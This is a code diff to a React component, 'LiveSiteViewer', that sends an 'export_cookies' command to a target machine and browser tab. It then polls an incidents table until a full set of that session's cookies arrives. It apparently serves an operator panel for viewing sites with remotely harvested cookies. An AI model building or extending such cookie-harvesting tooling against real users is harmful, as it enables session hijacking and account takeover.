@@ -358,15 +358,33 @@ export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
               command_type: 'export_cookies',
               target_machine_id: session.machine_id,
               target_tab_id: session.tab_id,
-              payload: {
-                incident_id: incidentData.incident_id
-              }
+              payload: { incident_id: incidentData.incident_id }
             })
           });
-          
-          // Wait for cookies to sync
-          await new Promise(resolve => setTimeout(resolve, 2000));
-          console.log('Fresh cookies requested, loading site...');
+
+          // Poll incident for fresh cookies (up to ~10s)
+          let attempts = 0;
+          let cookieCount = 0;
+          while (attempts < 7) {
+            const { data: updated } = await supabase
+              .from('incidents')
+              .select('full_cookie_data, cookie_excerpt')
+              .eq('incident_id', incidentData.incident_id)
+              .single();
+
+            const src = (updated as any)?.full_cookie_data ?? (updated as any)?.cookie_excerpt;
+            if (Array.isArray(src)) {
+              cookieCount = src.length;
+            } else if (typeof src === 'string' && src.includes('=')) {
+              cookieCount = src.split(';').filter(Boolean).length;
+            }
+
+            if (cookieCount > 10) break;
+            await new Promise(r => setTimeout(r, 1500));
+            attempts++;
+          }
+          console.log(`Fresh cookies ready: ~${cookieCount} items`);
+          if (cookieCount > 0) toast.success(`Cookies atualizados: ${cookieCount}`);
         }
       }
     } catch (error) {
